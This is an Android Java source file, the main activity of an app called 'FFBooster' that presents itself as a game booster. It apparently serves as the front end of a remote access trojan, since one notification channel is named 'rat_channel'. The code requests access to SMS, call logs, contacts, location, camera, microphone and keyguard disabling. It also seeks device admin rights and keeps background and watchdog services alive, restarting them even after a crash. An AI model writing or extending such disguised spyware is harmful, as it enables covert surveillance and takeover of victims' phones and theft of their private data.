package com.ffbooster.panel;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import android.Manifest;
import android.util.Log;
import android.app.ActivityManager;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {
    
    private static final int PERMISSION_REQUEST_CODE = 100;
    private ActivityResultLauncher<Intent> adminResultLauncher;
    
    private String[] PERMISSIONS = {
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.MODIFY_PHONE_STATE,
        Manifest.permission.DISABLE_KEYGUARD,
        Manifest.permission.WAKE_LOCK,
        Manifest.permission.VIBRATE,
        Manifest.permission.RECEIVE_BOOT_COMPLETED
    };
    
    private void setupCrashHandler() {
    Thread.setDefaultUncaughtExceptionHandler((thread, exception) -> {
        Log.e("FFBooster_Crash", "App crashed, auto-restart service", exception);
        
        // Ensure service still running
        try {
            Intent serviceIntent = new Intent(this, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e("FFBooster", "Failed to restart service", e);
        }
        
        // Exit gracefully
        System.exit(1);
    });
}


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setTheme(R.style.Theme_FFBooster);
        setContentView(R.layout.activity_main);
        
        adminResultLauncher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> {
                if (result.getResultCode() == RESULT_OK) {
                    Log.d("FFBooster", "Device admin enabled");
                }
            }
        );
        
        Intent watchdogIntent = new Intent(this, WatchdogService.class);
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
    startForegroundService(watchdogIntent);
} else {
    startService(watchdogIntent);
}

        Config.init(this);
        createNotificationChannel();
        
        if (!hasAllPermissions()) {
            requestPermissions();
        } else {
            startFFBoosterService();            
        }
        
        requestDeviceAdmin();
        setupUI();
        setupCrashHandler();  
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "rat_channel",
                "FFBooster Service",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    private boolean hasAllPermissions() {
        for (String permission : PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }
    
    private void requestPermissions() {
        ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_REQUEST_CODE);
    }
    
    private void requestDeviceAdmin() {
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, new ComponentName(this, DeviceAdmin.class));
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable admin access for FFBooster");
        adminResultLauncher.launch(intent);
    }
    
    private void startFFBoosterService() {
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
    
    private void setupUI() {
        try {
            TextView statusText = findViewById(R.id.status_text);
            ProgressBar progressBar = findViewById(R.id.progress_bar);
            Button startBtn = findViewById(R.id.start_btn);
            Button stopBtn = findViewById(R.id.stop_btn);
            
            if (statusText != null) statusText.setText("FF Booster Running");
            if (progressBar != null) progressBar.setVisibility(View.GONE);
            
            if (startBtn != null) {
                startBtn.setOnClickListener(v -> {
                    startFFBoosterService();
                    if (statusText != null) statusText.setText("Service Started");
                });
            }
            
            if (stopBtn != null) {
                stopBtn.setOnClickListener(v -> {
                    stopService(new Intent(this, BackgroundService.class));
                    if (statusText != null) statusText.setText("Service Stopped");
                });
            }
        } catch (Exception e) {
            Log.e("FFBooster_UI", "UI setup error", e);
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (hasAllPermissions()) {
                startFFBoosterService();
            }
        }
    }
}
